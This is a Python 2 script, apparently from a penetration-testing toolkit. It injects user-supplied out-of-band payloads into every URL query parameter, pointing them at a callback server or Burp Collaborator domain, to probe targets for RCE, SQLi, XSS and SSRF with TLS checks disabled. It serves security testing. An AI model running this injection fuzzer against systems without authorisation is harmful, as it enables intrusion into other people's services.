# coding: utf-8
#
### CREATED BY KARMAZ
#
#
### TO DO: 
# 1. add payload identification
# 2. Add payload mutations
### FUNCTIONS:
# 1. TEST URLS FOR OUT-OF-BAND EXPLOITATION.
# 2. TEST RCE
# 3. TEST SQLI
# 4. TEST XSS
# 5. TEST SSRF
###
# USAGE EXAMPLE:
#   ./crimson_oobtester.py \
#       -i "127.0.0.1" \
#       -d "asd.burpsuite.collaborator" \
#       -p "oob.txt" 
#       -w "urls.txt"
#
# PAYLOAD LINE PROPER FORMAT:
#   [payload]vps_ip
#   [PAYLOAD]domain_collab
###
import sys, time, getopt, urlparse, requests, os, ssl
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context
HOME = os.getenv('HOME')
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
from tqdm import tqdm

### OPTIONS ---
full_cmd_arguments = sys.argv
argument_list = full_cmd_arguments[1:]
short_options = "i:d:c:H:w:p:o:h"
long_options = ["ip", "domain", "cookies", "header", "wordlist", "payloads", "output", "help"]
try:
        arguments, values = getopt.getopt(argument_list, short_options, long_options)
except getopt.error as err:
        sys.exit(2)
### --- (They will be iterated at the bottom of the screen ---

def import_cookies(cookie):
    '''Importing cookies from header f.e. "Cookie: auth1=qwe; auth2=asd;" '''
    cookies = {}
    #cookie_header = cookie.split(":")[0]
    cookie_values = cookie.split(":")[1].split(";")[:-1]
    for q in cookie_values:
        cookies.update(dict([q.lstrip().split("=")]))
    return cookies


def edit_payloads(vps_ip,domain_collab,file_with_payloads):
    '''Edit payloads - swap vps_ip and domain_collab strings'''
    list_of_payloads = []
    with open(file_with_payloads) as payloads:
        for payload in payloads:
            if "vps_ip" in payload:
                list_of_payloads.append(payload.replace("vps_ip",vps_ip).rstrip())
            elif "domain_collab" in payload:
                list_of_payloads.append(payload.replace("domain_collab",domain_collab).rstrip())
    return list_of_payloads


def paramjuggler(url,payload):
    '''Make an combination with every parameter name of the query string with given payload'''
    parsed=urlparse.urlparse(url)
    #Extract queries table
    queries=parsed.query.split("&")
    for i,query in enumerate(queries):
        result = []
        new_queries = []
        new_queries = queries[:]
        new_parsed = ""
        #Extract the param from query
        param=(queries[i].split("=")[0] + "=")
        new_param=param+payload
        new_queries[i] = new_param
        new_parsed = parsed._replace(query="&".join(new_queries))
        result.append(urlparse.urlunparse(new_parsed))
        swapped_url = ("".join(result).rstrip())

    return swapped_url


def edit_urls(list_of_urls,list_of_payloads):
    '''Paramjuggler() for every swapped_urls'''
    swapped_urls = []
    with open(list_of_urls) as urls:
        for url in urls:
            for payload in list_of_payloads:
                swapped_urls.append(paramjuggler(url,payload))    
    return(swapped_urls)


def send_payloads_url(swapped_urls,headers, cookies):
    '''Send requests and save the logs'''
    output_list = []
    id = 0
    s = requests.Session()
    s.cookies.update(cookies)
    s.headers.update(headers)
    
    for url in tqdm(swapped_urls):
        id+=1
        s.get(url, verify=False, allow_redirects=True)
        output_list.append("ID: " + str(id) + " - TIME: " + str(datetime.now().time().strftime("%H:%M:%S")) + " - URL: " + url)
    return output_list


def helper():
    '''Print usage in case of wrong options or arguments being used'''
    print("""\033[0;31m
 ██████╗  ██████╗ ██████╗ ████████╗███████╗███████╗████████╗███████╗██████╗ 
██╔═══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║   ██║██║   ██║██████╔╝   ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝
██║   ██║██║   ██║██╔══██╗   ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝   ██║   ███████╗███████║   ██║   ███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                            \033[0m""")
    print("\nUSAGE: python crimson_oobtester.py \n\t-i \"vps_ip\" \n\t-d \"domain_collab\" \n\t-w \"wordlist_with_urls\" \n\t-H \"a=123\"  \n\t-c \"Cookie: a=1;\" \n\t-o \"output.txt\"")


def logs_saver(logs_list, logs_name):
    with open(logs_name, 'w') as f:
        for log in logs_list:
            print >> f, log


### OPTIONS ---
headers = {}
cookies ={}
show_help = False
try: logs_name
except NameError: logs_name = None
for current_argument, current_value in arguments:
    if current_argument in ("-i", "--ip"):
        vps_ip = current_value
    elif current_argument in ("-d", "--domain"):
        domain_collab = current_value
    elif current_argument in ("-c", "--cookies"):
        cookies = current_value
    elif current_argument in ("-H", "--header"):
        headers.update([current_value.split("=")])
    elif current_argument in ("-w", "--wordlist"):
        list_of_urls = current_value
    elif current_argument in ("-p", "--payloads"):
        file_with_payloads = current_value
    elif current_argument in ("-o", "--output"):
        logs_name = current_value
    elif current_argument in ("-h", "--help"):
        show_help = True
### ---


### MAIN
if __name__ == '__main__':
    if show_help:
        helper()
    else:
        # 1) Change the ip and domain in payload list
        list_of_payloads = edit_payloads(vps_ip,domain_collab,file_with_payloads)
        # 2) Create list of urls with payloads
        swapped_urls = edit_urls(list_of_urls,list_of_payloads)
        if cookies:
            cookies = import_cookies(cookies)
        print("\033[0;31m [+]\033[0m STARTING OOB INJECTIONS")
        # 3) Send requests
        output_list = send_payloads_url(swapped_urls, headers, cookies)
        # 4) Save or print the results
        if logs_name is not None:
            if output_list:
                logs_saver(output_list, logs_name)
        else:
            for element in output_list:
                print(element.rstrip())